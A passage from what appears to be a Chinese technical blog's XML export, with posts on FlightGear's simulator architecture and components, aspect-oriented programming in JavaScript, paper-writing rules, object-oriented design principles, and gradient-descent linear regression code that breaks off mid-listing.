    <content type="text"><![CDATA[FlightGear是一个始于1997年多平台飞行模拟器、开源软件项目[1]。该项目适用的操作系统主要包括Linux、Microsoft Windows和Mac OS X，采用C++编写。 FlightGear体系结构当前体系结构FlightGear体系结构基于一个名为“主循环”的无限循环[2]。其流程图如图1所示。在主循环中将依次完成如下工作: ATC模拟 控制AI对象 在多用户环境中更新其他飞机 飞行动力学计算 风景更新 音频调度 渲染 图1 FlightGear主循环流程图 高级体系结构FlightGear正在支持高级体系结构(High Level Architecture, HLA)[3][4]。 HLA简介高级体系结构（HLA）是分布式仿真的标准，用于通过组合（联合）多个仿真来构建用于更大目的的仿真。该标准是在美国国防部的领导下于90年代开发的，后来转变为开放的国际IEEE标准。它是北约通过STANAG 4603推荐的标准。今天，HLA被用于许多领域，包括国防和安全以及民用应用。该体系结构指定以下组件： 运行时基础结构（RTI），通过不同的编程语言提供标准化的服务集。这些服务包括信息交换，同步和联合管理 联邦成员（Federates）是使用RTI服务的单独仿真系统，由多个联邦成员对象构成。 联邦成员对象模型（FOM），指定用于交换数据的对象类和交互类。 FOM可以描述任何域的信息。 图2 HLA构成 HLA标准由三部分组成： IEEE Std 1516-2010框架和规则，它规定了组件或整个联合应遵守的十个体系结构规则。 IEEE Std 1516.1-2010联邦接口规范，规定了RTI应提供的服务。这些服务以C ++和Java API以及Web服务的形式提供。 IEEE Std 1516.2-2010对象模型模板规范，它规定了HLA对象模型（如FOM）应使用的格式。 HLA优势与单机仿真相比，这有三大优势[5]（例如FlightGear V3.6）： 它提供了一个强大的环境，使模拟器具有多线程，利用具有多个内核的计算机，或者在不同的计算机（甚至包括不同的平台和操作系统）上运行模拟的不同部分。 它允许我们分离模拟器的部分，如AI（通过解耦AI交通系统）、FDM、Nasal脚本和渲染器，以及较少时间关键的子系统，如天气，这样我们就可以获得一致（也许更高）的帧速率（即减少Nasal垃圾收集对帧速率的影响）。 它提供了一个非常好的框架，允许任何人使用除C / C ++之外的编程语言（想想Ada，Java，Python等）创建与FlightGear交互的组件，这些编程语言可能在他们自己的线程中运行，并且驻留在单独的二进制文件中，这也更容易调试/排除故障（想想回归测试，即在专用的gdb / valgrind会话中运行一个自包含的子系统），而不必知道如何修改/补丁和重建FlightGear。 FlightGear组件构成FlightGear由很多开源组件或程序构成[6]，具体包括： RTIRTI是HLA架构的关键组件，相当于中间件。 OpenRTIOpenRTI是一个包含了rti 1.3、rti 1516、rti 1516e标准接口实现的rti库。OpenRTI有如下关键特性： 易用性高，非常便于使用； 直接提供C++调用接口，也可以提供Java接口，但目前还没有编码实现； 可扩展性强； 一直在维护中的RTI开源项目； 树状的服务器结构； 最短路径在内存中不拷贝数据； 不依赖其它项目，仅仅需要C++编译器，特别的不需要boost； 支持线程间通信、rti通信和管道间通信，未来可能支持http通信； 到处都可以运行，能够在Linux、Win32、MacOS和Solaris上运行。 FDM飞行动力学模型（Flight Dynamics Model, FDM）是模拟器内控制飞机物理飞行的数学模型。飞机的3D模型实质是一张图片，其与飞行动力学无关，本质上由FDM控制飞机如何飞行。在FlightGear中主要使用JSBSim和YASim两个飞行动力学模型。 JSBSimJSBSim是一个用C++实现的开源跨平台飞行器动力学模型软件。Flightgear也采用了JSBSim作为其中的飞行器动力模型之一。同时JSBSim也可以作为一个单独的动力学模型软件进行运行。 YASimYASim使用飞机的几何形状生成基本飞行特征。虽然这表明了一种“现实的”或开箱即用的方法，但在获得接近现实主义的结果之前，这只是一种粗略的近似，需要进行大量的调整。如果您的飞机有稳定的飞行数据，例如风洞数据，或者您希望最终生成超逼真的模拟，那么JSBSim可能是更好的方法。 如果你缺乏这样的数据但是知道飞机的几何形状并且能够获得与真实飞行员相同的飞行特性和限制，那么YASim可以提供足以满足大多数模拟需求的解决方案。 AtlasAtlas旨在为FlightGear（一种开源飞行模拟器）的用户制作和展示世界高质量的图表。 这是通过两个主要部分实现的：地图创建者（简称为Map）和Atlas查看器。 地图创建者从FlightGear获取风景数据并将其转换为漂亮的地图图片，可以使用您可能已安装的任何位图图像程序或使用Atlas查看应用程序查看。 Atlas查看应用程序可用于浏览您的地图，但也可以直接连接到FlightGear，并在所谓的移动地图显示上显示您的飞机当前位置。 FlightGear Multiplayer ServerFGMS或FlightGear多人游戏服务器是FlightGear的独立网络服务器，并根据GPL许可。它允许通过FGFS内的网络与其他飞行员一起飞行。 可以在服务器配置中配置的服务器列表类型： 中继服务器 - 网络中的其他服务器。 每个都必须有完整的列表（减去自己）以获得适当的网络功能。 交叉馈送服务器 - 服务器从本地用户和其他服务器接收的所有内容都将转发到交叉馈送服务器。 用于在同一主机上运行多个连接的fgms实例，例如 用于提供跟踪和未跟踪服务，而不会产生额外的外部流量。 跟踪器 - 服务器每10秒向跟踪器发送一个每个本地用户的摘要更新。 HUB - 通常服务器不会将从服务器接收的数据包发送到其他中继。 HUB服务器将数据从服务器发送到它知道的所有中继。 FGCOMFGCom是一种语音通信功能。这样您就可以在飞行途中与其他飞行员和空域管制员进行通信。 主要思想是重现真实的航空通信，换句话说，此功能旨在使您的航班期间尽可能真实地进行无线电通信。 FGCom有两种方式： 集成到FlightGear（FGCom内置）：这当然是更好的解决方案，因为更容易使用外部软件（FGCom standalone）：只有在计划在特殊情况下使用FGCom时才应使用此软件 MPmapMPMap是一个实用程序，可以在世界地图上显示在FlightGear世界中飞行的飞机。 除此之外，它还提供对导航数据的访问，例如ILS频率，跑道号和修正。由于它使用谷歌地图，人们可以选择地图或卫星视图。 SimGearSimGear是FlightGear使用的一组开源软件库。该项目仍在开发中，但其目标是成为“仿真内核”，并由其他非FlightGear项目使用。该项目于2000年启动。SimGear与FlightGear和TerraGear一样，需要PLIB进行构建。 SimGear是一个仿真架构工具集(simulation construction tools)，是FlightGear的仿真引擎，完成了数据结构操作、星历计算、模拟天空、坐标系转换等大部分的工作，它也是一个开源库。 PLibPLIB（便携式游戏库）是由Steve J. Baker编写的一套用于编写游戏的软件库。 FlightGear在其大部分开发中使用了PLIB。 它也被FlightGear相关程序Atlas使用。 PLIB是开源的，并且是在GNU Library General Public License下发布的。 FlightGear 1.0（2007年发布）是在向OpenSceneGraph（OSG）过渡之前使用PLIB进行3D场景图的最后一次公开发布。 FlightGear仍然使用PLIB执行各种任务; 例如，读取操纵杆输入并显示图形用户界面（GUI）。 在后一种用法中，PLIB的PUI组件最终将由Canvas和Phi在FlightGear中替换，这将极大地改善当前GUI的功能，超出PUI提供的功能。 构建FlightGear时需要PLIB。 OSGOSG是OpenSceneGraph的缩写，OpenSceneGraph图形系统是一个基于工业标准OpenGL的软件接口，它让程序员能够更加快速、便捷地创建高性能、跨平台的交互式图形程序。相比于工业标准OpenGL或者其他图形库，OpenSceneGraph的优点明显，除了程序开源和平台无关性以外，其封装并提供了数量众多的提升程序运行时性能的算法、针对包括分页数据库在内的几乎所有的主流数据格式的直接数据接口、 以及针对脚本语言系统Pthyon和Tcl的支持。 OpenGL是Open Graphics Library的缩写，其独立于硬件，独立于窗口系统，在运行各种操作系统的各种计算机上都可用，并能在网络环境下以客户/服务器模式工作，是专业图形处理、科学计算等高端应用领域的标准图形库。 场景相关工具TerraSync要查看飞机下方的地形，您必须安装相应的风景。这可以通过在安装风景的文章中描述的在飞行之前下载某些景点来实现。 或者，如果您有稳定且相当快速的互联网连接，则可以使用TerraSync。它是一个实用程序，可在模拟器运行时自动下载所需FlightGear场景的最新版本。 TerraSync在后台运行（可选择作为单独的进程），监视您的位置，并从“主时间”服务器“及时”下载（或更新）最新的场景。一段时间以来，TerraSync已经集成到核心FlightGear流程中，因此不需要为典型用户处理TerraSync。 TerraSync的主存储库，即TerraSync从中下载文件的在线资源，每天与FlightGear Scenery数据库同步一次。因此，当使用TerraSync时，您将永远拥有 最新的.stg文件，告诉FlightGear放置对象的位置 最新的对象静态模型。 （静态模型定义仅存在于一个地方的唯一对象，例如着名的建筑物或地标。） 最新的对象共享模型。 （通用模型在不同的地方使用不止一次，每个都可以代表许多不同的对象，如通用房屋或船舶） TerrGearTerraGear是开源工具和渲染库的集合，可以在地球的3D表示（即3D模型或3D地图）中转换公开可用的GIS数据，以用于实时渲染项目。 TerraGear可以导入3D数据集，例如DEM地形网格，2D多边形数据集（如海岸线，城市轮廓，湖泊轮廓）和2D栅格数据集，例如1 km NAOO土地利用/土地覆盖数据。它还具有基于可用的FAA数据生成逼真的机场，跑道和照明的工具。 TerraGear是用于为FlightGear项目生成场景的主要工具。 如果没有terragear，可以更改Terrain纹理，但不能更改地形。如果要更改城市的纹理，请更改材质文件。如果你想改变海岸线，你需要terragear。检查目录FGDATA/Material中的材料文件，你需要terragear。 参考链接 FlightGear,by wikipedia. A NEW ARCHITECTURE FOR FLIGHTGEAR FLIGHT SIMULATOR,by flightgear. FlightGear high-level architecture support,by flightgear Developing with HLA,by flightgear. High-Level Architecture,by flightgear. High-level architecture,by wikipedia. FlightGear related projects,by wikipedia. OpenRTI,by openrti. JSBSim,by wikipedia. YASim,by flightgear. JSBSim vs YASim,by flightgear. Atlas,by atlas. FGCom 3.0,by wikipedia. FlightGear Multiplayer Server,by flightgear. SimGear,by flightgear. PLIB,by flightgear. OSG,by flightgear. Flightgear操作方式以及几种典型飞机的起飞方法,by Mosquito_蚊子.]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>3D</tag>
        <tag>计算机仿真</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[面向方面编程简介]]></title>
    <url>%2F2019%2F01%2F23%2F%E9%9D%A2%E5%90%91%E6%96%B9%E9%9D%A2%E7%BC%96%E7%A8%8B%E7%AE%80%E4%BB%8B%2F</url>
    <content type="text"><![CDATA[什么是面向方面编程(What)面向侧面的程序设计（aspect-oriented programming，AOP，又译作面向方面的程序设计、观点导向编程、剖面导向程序设计）是计算机科学中的一个术语，指一种程序设计范型。该范型以一种称为侧面（aspect，又译作方面）的语言构造为基础，侧面是一种新的模块化机制，用来描述分散在对象、类或函数中的横切关注点（crosscutting concern）。 侧面的概念源于对面向对象的程序设计的改进，但并不只限于此，它还可以用来改进传统的函数。与侧面相关的编程概念还包括元对象协议、主题（subject）、混入（mixin）和委托。 基本概念 关注点（concern）：对软件工程有意义的小的、可管理的、可描述的软件组成部分，一个关注点通常只同一个特定概念或目标相关联。 主关注点（core concern）：一个软件最主要的关注点。 关注点分离（separation of concerns，SOC）：标识、封装和操纵只与特定概念、目标相关联的软件组成部分的能力，即标识、封装和操纵关注点的能力。 方法（method）：用来描述、设计、实现一个给定关注点的软件构造单位。 横切（crosscut）：两个关注点相互横切，如果实现它们的方法存在交集。 支配性分解（dominant decomposition）：将软件分解成模块的主要方式。传统的程序设计语言是以一种线性的文本来描述软件的，只采用一种方式（比如：类）将软件分解成模块；这导致某些关注点比较好的被捕捉，容易进一步组合、扩展；但还有一些关注点没有被捕捉，弥散在整个软件内部。支配性分解一般是按主关注点进行模块分解的。 横切关注点（crosscutting concerns）：在传统的程序设计语言中，除了主关注点可以被支配性分解方式捕捉以外，还有许多没有被支配性分解方式捕捉到的关注点，这些关注点的实现会弥散在整个软件内部，这时这些关注点同主关注点是横切的。 侧面（aspect）：在支配性分解的基础上，提供的一种辅助的模块化机制，这种新的模块化机制可以捕捉横切关注点。 从主关注点中分离出横切关注点是面向侧面的程序设计的核心概念。分离关注点使得解决特定领域问题的代码从业务逻辑中独立出来，业务逻辑的代码中不再含有针对特定领域问题代码的调用，业务逻辑同特定领域问题的关系通过侧面来封装、维护，这样原本分散在在整个应用程序中的变动就可以很好的管理起来。 对于一个信用卡应用程序来说，存款、取款、帐单管理是它的主关注点，日志和持久化将成为横切整个对象结构的横切关注点。 为什么需要面向方面编程(Why)AOP技术的优势是显而易见的。在面向对象的世界里，人们提出了各种方法和设计原则来保障系统的可复用性与可扩展性，以期建立一个松散耦合、便于扩展的软件系统。例如GOF提出的“设计模式”，为我们提供了设计的典范与准则。设计模式通过最大程度的利用面向对象的特性，诸如利用继承、多态，对责任进行分离、对依赖进行倒置，面向抽象，面向接口，最终设计出灵活、可扩展、可重用的类库、组件，乃至于整个系统的架构。在设计的过程中，通过各种模式体现对象的行为、暴露的接口、对象间关系、以及对象分别在不同层次中表现出来的形态。然而鉴于对象封装的特殊性，“设计模式”的触角始终在接口与抽象中大做文章，而对于对象内部则无能为力。 通过“横切”技术，AOP技术就能深入到对象内部翻云覆雨，截取方法之间传递的消息为我所用。由于将核心关注点与横切关注点完全隔离，使得我们能够独立的对“方面”编程。它允许开发者动态地修改静态的OO模型，构造出一个能够不断增长以满足新增需求的系统，就象现实世界中的对象会在其生命周期中不断改变自身，应用程序也可以在发展中拥有新的功能。 设计软件系统时应用AOP技术，其优势在于： 在定义应用程序对某种服务（例如日志）的所有需求的时候。通过识别关注点，使得该服务能够被更好的定义，更好的被编写代码，并获得更多的功能。这种方式还能够处理在代码涉及到多个功能的时候所出现的问题，例如改变某一个功能可能会影响到其它的功能，在AOP中把这样的麻烦称之为“纠结（tangling）”。 利用AOP技术对离散的方面进行的分析将有助于为开发团队指定一位精于该项工作的专家。负责这项工作的最佳人选将可以有效利用自己的相关技能和经验。 持久性。标准的面向对象的项目开发中，不同的开发人员通常会为某项服务编写相同的代码，例如日志记录。随后他们会在自己的实施中分别对日志进行处理以满足不同单个对象的需求。而通过创建一段单独的代码片段，AOP提供了解决这一问题的持久简单的方案，这一方案强调了未来功能的重用性和易维护性：不需要在整个应用程序中一遍遍重新编写日志代码，AOP使得仅仅编写日志方面（logging aspect）成为可能，并且可以在这之上为整个应用程序提供新的功能。 总而言之，AOP技术的优势使得需要编写的代码量大大缩减，节省了时间，控制了开发成本。同时也使得开发人员可以集中关注于系统的核心商业逻辑。此外，它更利于创建松散耦合、可复用与可扩展的大型软件系统。 如何实现面向方面编程(How)使用js实现before（前置通知）、after（后置通知）、around（环绕通知）。 before（前置通知）before函数，用来实现函数的前置通知。在目标函数的前面执行一些前置操作。1234567891011121314151617181920212223242526272829// AOP 前置通知函数声明/** * 给方法加入前置切片函数 * 可以在执行方法之前执行一些操作, * 前置切片的返回值为false时，不影响原方法的执行 * @param func &#123;Function&#125; 被前置执行的函数 * @return &#123;Function&#125; 加入前置通知的函数 */Function.prototype._before = function(func)&#123; var __self = this; return function()&#123; func.apply(__self, arguments); return __self.apply(__self, arguments); &#125;&#125;// 代码function a()&#123; console.log(&apos;I\&apos;m a&apos;);&#125;a = a._before(function()&#123; console.log(&apos;before&apos;);&#125;);a();// 结果：// before// I&apos;m a after（后置通知）after函数，用来实现函数的后置通知。在目标函数的后面面执行一些后置操作。 12345678910111213141516171819202122232425262728293031// AOP 后置通知函数声明/** * 给方法加入后置切片函数 * 可以在执行方法之之后执行一些操作 * 后置切片的返回值为false时，不影响原方法的执行 * @param func &#123;Function&#125; 被后置执行的函数 * @return &#123;Function&#125; 加入后置通知的函数 * @constructor */Function.prototype._after = function(func)&#123; var __self = this; return function()&#123; var ret = __self.apply(__self, arguments); func.apply(__self, arguments); return ret; &#125;&#125;// 代码function b()&#123; console.log(&apos;I\&apos;m b&apos;);&#125;b = b._after(function()&#123; console.log(&apos;after&apos;);&#125;);b();// 结果：// I&apos;m b// after around（环绕通知）在around函数中，引入了一个JoinPoint对象。JoinPoint对象封装了目标函数和目标函数的参数。在调用JoinPoint对象的invoke函数时，会去调用原来的目标函数。在调用invoke时，如果需要改变目标函数的this对象，需要将对象传入到invoke的参数中。around函数，可以在目标函数的前面和后面随意加入逻辑代码，也可以根据条件判断是否执行目标函数。1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071// AOP 环绕通知函数声明/** * 切入点对象 * 不允许切入对象多次调用 * @param obj 对象 * @param args 参数 * @constructor */function JoinPoint(obj, args)&#123; var isapply = false; // 判断是否执行过目标函数 var result = null; // 保存目标函数的执行结果 this.source = obj; // 目标函数对象 this.args = args; // 目标函数对象传入的参数 /** * 目标函数的代理执行函数 * 如果被调用过，不能重复调用 * @return &#123;object&#125; 目标函数的返回结果 */ this.invoke = function(thiz)&#123; if(isapply)&#123; return; &#125; isapply = true; result = this.source.apply(thiz || this.source, this.args); return result; &#125;; // 获取目标函数执行结果 this.getResult = function()&#123; return result; &#125;&#125;/** * 方法环绕通知 * 原方法的执行需在环绕通知方法中执行 * @param func &#123;Function&#125; 环绕通知的函数 * 程序会往func中传入一个JoinPoint(切入点)对象, 在适当的时机 * 执行JoinPoint对象的invoke函数，调用目标函数 * * @return &#123;Function&#125; 切入环绕通知后的函数， */Function.prototype._around = function(func)&#123; var __self = this; return function()&#123; var args = [new JoinPoint(__self, arguments)]; return func.apply(this, args); &#125;&#125;// 代码var isAdmin = true;function c()&#123; console.log(&apos;show user list&apos;);&#125;c = c._around(function(joinpoint)&#123; if(isAdmin)&#123; // 满足条件时，执行目标函数 console.log(&apos;is admin&apos;); joinpoint.invoke(this); &#125;&#125;);c();// 结果// if isAdmin == true// is admin// show user list// if isAdmin == false 参考链接 面向侧面的程序设计,by wikipedia. 什么是面向切面编程AOP？,by 知乎. 什么是面向方面编程,by liuweitoo. AOP面向方面编程,by 规速. 团队开发框架实战—面向切面的编程 AOP,by Bobby0322. 轻松理解AOP(面向切面编程),by -望远-. AOP在JS中的实现及应用,by _Sirius.]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>软件工程</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[如何写好一篇论文的十条基本原则]]></title>
    <url>%2F2019%2F01%2F17%2F%E5%A6%82%E4%BD%95%E5%86%99%E5%A5%BD%E4%B8%80%E7%AF%87%E8%AE%BA%E6%96%87%E7%9A%84%E5%8D%81%E6%9D%A1%E5%9F%BA%E6%9C%AC%E5%8E%9F%E5%88%99%2F</url>
    <content type="text"><![CDATA[看到一篇有关如何撰写科技论文的好文章，赶紧摘抄一下。 原则（规则 1–4）写作即交流。因此，读者体验是首等重要的，所有的写作服务于这一目标。当你写作时，心中要时时有读者。以下四条规则是关于如何赢取读者。 规则 1：论文有一个中心主旨，并体现在标题中规则 2：假设写作对象对论文内容一无所知规则 3：坚持原因、内容和结论（Context-Content-Conclusion／C-C-C）结构规则 4：避免委婉，使用并行优化的逻辑流论文组成（规则 5-8）论文的摘要、介绍、结果与讨论都适用于 C-C-C 结构，但各有些许不同。在下图中，我们将讨论这些专门结构的问题： 规则 5：在摘要中总结所有要点规则 6：在介绍中讨论这篇论文的重要性规则 7：用多个逻辑相关的陈述句（可辅以图表）给出支持论文中心思想的结果规则 8：讨论如何填补差距、论文的局限性和论文与该领域的相关性写作流程（规则 9 和 10）规则 9：把时间花费到关键的地方：题目、摘要、图和大纲规则 10：获取反馈，然后简化、重新使用、再次构造这个故事参考链接 从标题到写作流程：写好一篇论文的十条基本原则,by 机器之心.]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>科研</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[面向对象编程的设计原则]]></title>
    <url>%2F2019%2F01%2F17%2F%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E7%BC%96%E7%A8%8B%E7%9A%84%E8%AE%BE%E8%AE%A1%E5%8E%9F%E5%88%99%2F</url>
    <content type="text"><![CDATA[说来惭愧，我虽然计算机科学专业科班出生，但是对面向对象编程的理解并不透彻。但在看到“如何写一手漂亮的模型：面向对象编程的设计原则综述”后，感觉收获不少，欣喜之余赶紧摘抄记录一下。 面向对象编程的设计原则为了写出清晰的、高质量的、可维护并且可扩展的代码，面向对象编程（OOP）将是我们最佳的选择。 对象类型因为我们要围绕对象来建立代码，所以区分它们的不同责任和变化是有用的。一般来说，面向对象的编程有三种类型的对象。 实体对象这类对象通常对应着问题空间中的一些现实实体。比如我们要建立一个角色扮演游戏（RPG），那么简单的 Hero 类就是一个实体对象。 这类对象通常包含关于它们自身的属性（例如 health 或 mana），这些属性根据具体的规则都是可修改的。 控制对象（Control Object）控制对象（有时候也称作管理对象）主要负责与其它对象的协调，这是一些管理并调用其它对象的对象。我们上面的 RPG 案例中有一个很棒的例子，Fight 类控制两个英雄，并让它们对战。 在这种类中，为对战封装编程逻辑可以给我们提供多个好处：其中之一就是动作的可扩展性。我们可以很容易地将参与战斗的英雄传递给非玩家角色（NPC），这样它们就能利用相同的 API。我们还可以很容易地继承这个类，并复写一些功能来满足新的需要。 边界对象（Boundary Object）这些是处在系统边缘的对象。任何一个从其它系统获取输入或者给其它系统产生输出的对象都可以被归类为边界对象，无论那个系统是用户，互联网或者是数据库。 这些边界对象负责向系统内部或者外部传递信息。例如对要接收的用户指令，我们需要一个边界对象来将键盘输入（比如一个空格键）转换为一个可识别的域事件（例如角色的跳跃）。 Bonus：值对象（Value Object）价值对象代表的是域（domain）中的一个简单值。它们无法改变，不恒一。 如果将它们结合在我们的游戏中，Money 类或者 Damage 类就表示这种对象。上述的对象让我们容易地区分、寻找和调试相关功能，然而仅使用基础的整形数组或者整数却无法实现这些功能。 它们可以归类为实体对象的子类别。 关键设计原则设计原则是软件设计中的规则，过去这些年里已经证明它们是有价值的。严格地遵循这些原则有助于软件达到一流的质量。 抽象（Abstraction）抽象就是将一个概念在一定的语境中简化为原始本质的一种思想。它允许我们拆解一个概念来更好的理解它。 上面的游戏案例阐述了抽象，让我们来看一下 Fight 类是如何构建的。我们以尽可能简单的方式使用它，即在实例化的过程中给它两个英雄作为参数，然后调用 fight() 方法。不多也不少，就这些。 封装封装可以被认为是将某些东西放在一个类以内，并限制了它向外部展现的信息。在软件中，限制对内部对象和属性的访问有助于保证数据的完整性。 将内部编程逻辑封装成黑盒子，我们的类将更容易管理，因为我们知道哪部分可以被其它系统使用，哪些不行。这意味着我们在保留公共部分并且保证不破坏任何东西的同时能够重用内部逻辑。此外，我们从外部使用封装功能变得更加简单，因为需要考虑的事情也更少。 分解分解就是把一个对象分割为多个更小的独立部分，这些独立的部分更易于理解、维护和编程。 试想我们现在希望 Hero 类能结合更多的 RPG 特征，例如 buffs，资产，装备，角色属性。 解决方案就是将 Hero 对象分解为多个更小的对象，每个小对象可承担一些功能。 下面是三种分解关系： 关联：在两个组成部分之间定义一个松弛的关系。两个组成部分不互相依赖，但是可以一起工作。例如 Hero 对象和 Zone 对象。 聚合：在整体和部分之间定义一个弱「包含」关系。这种关系比较弱，因为部分可以在没有整体的时候存在。例如 HeroInventory（英雄财产）和 Item（条目）。HeroInventory 可以有很多 Items，而且一个 Items 也可以属于任何 HeroInventory（例如交易条目）。 组成：一个强「包含」关系，其中整体和部分不能彼此分离。部分不能被共享，因为整体要依赖于这些特定的部分。例如 Hero（英雄）和 HeroAttributes（英雄属性）。 泛化泛化可能是最重要的设计原则，即我们提取共享特征，并将它们结合到一起的过程。我们都知道函数和类的继承，这就是一种泛化。 做一个比较可能会将这个解释得更加清楚：尽管抽象通过隐藏非必需的细节减少了复杂性，但是泛化通过用一个单独构造体来替代多个执行类似功能的实体。 在给出的例子中，我们将常用的 Hero 类和 NPC 类泛化为一个共同的父类 Entity，并通过继承简化子类的构建。 这里，我们通过将它们的共同功能移动到基本类中来减少复杂性，而不是让 NPC 类和 Hero 类将所有的功能都实现两次。 组合组合就是把多个对象结合为一个更复杂对象的过程。这种方法会创建对象的示例，并且使用它们的功能，而不是直接继承它。 使用组合原则的对象就被称作组合对象（composite object）。这种组合对象在要比所有组成部分都简单，这是非常重要的一点。当把多个类结合成一个类的时候，我们希望把抽象的层次提高一些，让对象更加简单。 组合对象的 API 必须隐藏它的内部模块，以及内部模块之间的交互。就像一个机械时钟，它有三个展示时间的指针，以及一个设置时间的旋钮，但是它内部包含很多运动的独立部件。 正如我所说的，组合要优于继承，这意味着我们应该努力将共用功能移动到一个独立的对象中，然后其它类就使用这个对象的功能，而不是将它隐藏在所继承的基本类中。 批判性思考尽管这些设计原则是在数十年经验中形成的，但盲目地将这些原则应用到代码之前进行批判性思考是很重要的。 任何事情都是过犹不及！有时候这些原则可以走得很远，但是实际上有时会变成一些很难使用的东西。 作为一个工程师，我们需要根据独特的情境去批判地评价最好的方法，而不是盲目地遵从并应用任意的原则。 关注点的内聚、耦合和分离内聚（Cohesion）内聚代表的是模块内部责任的分明，或者是模块的复杂度。 如果我们的类只执行一个任务，而没有其它明确的目标，那么这个类就有着高度内聚性。另一方面，如果从某种程度而言它在做的事情并不清楚，或者具有多于一个的目标，那么它的内聚性就非常低。 我们希望代码具有较高的内聚性，如果发现它们有非常多的目标，或许我们应该将它们分割出来。 耦合耦合获取的是连接不同类的复杂度。我们希望类与其它的类具有尽可能少、尽可能简单的联系，所以我们就可以在未来的事件中交换它们（例如改变网络框架）。 在很多编程语言中，这都是通过大量使用接口来实现的，它们抽象出处理特定逻辑的类，然后表征为一种适配层，每个类都可以嵌入其中。 分离关注点分离关注点（SoC）是这样一种思想：软件系统必须被分割为功能上互不重叠的部分。或者说关注点必须分布在不同的地方，其中关注点表示能够为一个问题提供解决方案。 网页就是一个很好的例子，它具有三个层（信息层、表示层和行为层），这三个层被分为三个不同的地方（分别是 HTML，CSS，以及 JS）。 如果重新回顾一下我们的 RPG 例子，你会发现它在最开始具有很多关注点（应用 buffs 来计算袭击伤害、处理资产、装备条目，以及管理属性）。我们通过分解将那些关注点分割成更多的内聚类，它们抽象并封装了它们的细节。我们的 Hero 类现在仅仅作为一个组合对象，它比之前更加简单。 结语对小规模的代码应用这些原则可能看起来很复杂。但是事实上，对于未来想要开发和维护的任何一个软件项目而言，这些规则都是必须的。在刚开始写这种代码会有些成本，但是从长期来看，它会回报以几倍增长。 这些原则保证我们的系统更加： 可扩展：高内聚使得不用关心不相关的功能就可以更容易地实现新模块。可维护：低耦合保证一个模块的改变通常不会影响其它模块。高内聚保证一个系统需求的改变只需要更改尽可能少的类。可重用：高内聚保证一个模块的功能是完整的，也是被妥善定义的。低耦合使得模块尽可能少地依赖系统的其它部分，这使得模块在其它软件中的重用变得更加容易。 参考链接 如何写一手漂亮的模型：面向对象编程的设计原则综述,by 机器之心. 什么是面向切面编程AOP？,by 知乎. 什么是面向方面编程,by liuweitoo. AOP面向方面编程,by 规速. 团队开发框架实战—面向切面的编程 AOP,by Bobby0322. 轻松理解AOP(面向切面编程),by -望远-. 依赖注入,by android-cn.]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>软件工程</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[机器学习之线性回归问题求解]]></title>
    <url>%2F2019%2F01%2F12%2F%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E4%B9%8B%E7%BA%BF%E6%80%A7%E5%9B%9E%E5%BD%92%E9%97%AE%E9%A2%98%E6%B1%82%E8%A7%A3%2F</url>
    <content type="text"><![CDATA[在统计学中，线性回归（Linear regression）是利用称为线性回归方程的最小二乘函数对一个或多个自变量和因变量之间关系进行建模的一种回归分析。这种函数是一个或多个称为回归系数的模型参数的线性组合。只有一个自变量的情况称为简单回归，大于一个自变量情况的叫做多元回归。下面以简单线性回归为例，以机器学习的方法求解此问题。 问题设定已知有 $N$ 个 $x, y$ 对构成数据集 $X, Y$ ，他们在坐标轴上的分布如下图： 现在希望找到一个函数： h(x) = wx+b这个函数会尽可能的拟合数据集 $X, Y$ ，为了做到这点，我们希望这个函数 $h(x)$ 在 $X$ 上每一个取值 $x_i$ 的函数值 $h(x_i)$ 与 $Y$ 上每一个对应的 $y_i$ 的平方差尽可能小。即找到一组 $w, b$ ，能使得 $loss(w, b)$ 最小。 loss(w, b) = \frac{1}{N}\sum^{N}_{i=0}(wx_i+b-y_i)^2问题求解采用梯度下降法找到目标 $w, b$，先随机初始化一对 $w_0, b_0$。由于函数的负梯度方向是函数值下降最快的方向，因此对 $w, b$ 求其偏微分: \begin{aligned} \frac{\partial loss(w, b)}{\partial w} &= \frac{2}{N}\sum^{N}_{i=0}(wx_i+b-y_i)\cdot x_i, \\ \frac{\partial loss(w, b)}{\partial b} &= \frac{2}{N}\sum^{N}_{i=0}(wx_i+b-y_i) \end{aligned}再通过下式在每次迭代中更新 $w, b$ ： \begin{aligned} w_{t+1} &= w_t - \eta \frac{\partial l(w_t, b_t)}{\partial w_t} \\ b_{t+1} &= b_t - \eta \frac{\partial l(w_t, b_t)}{\partial b_t} \end{aligned}其中， $\eta$ 是学习率。 python实现12345678910111213141516171819202122232425262728293031323334353637383940414243444546# -*- coding: utf-8 -*-# %matplotlib inlineimport matplotlib.pyplot as pltimport numpy as np# 生成100对x, ydata_count = 100w_cache, b_cache, l_cache, = [], [], []# 学习速度learning_rate = 0.003# 迭代次数training_steps = 3000x_data = np.linspace(-20, 20, data_count)y_data = np.multiply(4, x_data) + 7 + np.random.normal(loc=0, scale=8.0, size=(data_count,))# 初始化w和bw = np.random.rand()b = np.random.rand()y_predict = w * x_data + b# 梯度下降迭代3000次for iteration in range(training_steps): y_predict = w * x_data + b diff = y_predict - y_data error = np.sum(np.square(diff)) / data_count grad_w = np.mean(diff * x_data) grad_b = np.mean(diff) w -= learning_rate * grad_w b -= learning_rate * grad_b w_cache.append(w) b_cache.append(b) l_cache.append(error)y_predict = w * x_data + b# 绘制结果plt.figure(figsize=(10, 6))plt.scatter(x_data, y_data, s=10, color=&apos;g&apos;)plt.plot(x_data, y_predict)plt.title(&apos;y=4x+7&apos;)plt.xlabel(&apos;x&apos;)plt.ylabel(&apos;y&apos;)plt.show() tensorflow实现123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081# -*- coding: utf-8 -*-import tensorflow as tfimport matplotlib.pyplot as pltimport numpy as np# 初始化变量和模型参数，定义训练闭环中的运算# 生成100对x, ydata_count = 100# 超参数，实际的训练迭代次数training_steps=1000# 超参数，学习速率learning_rate=0.003# 定义tf graph输入X = tf.placeholder(tf.float32)Y = tf.placeholder(tf.float32)# 定义模型参数W = tf.Variable(np.random.randn(), name=&quot;weight&quot;, 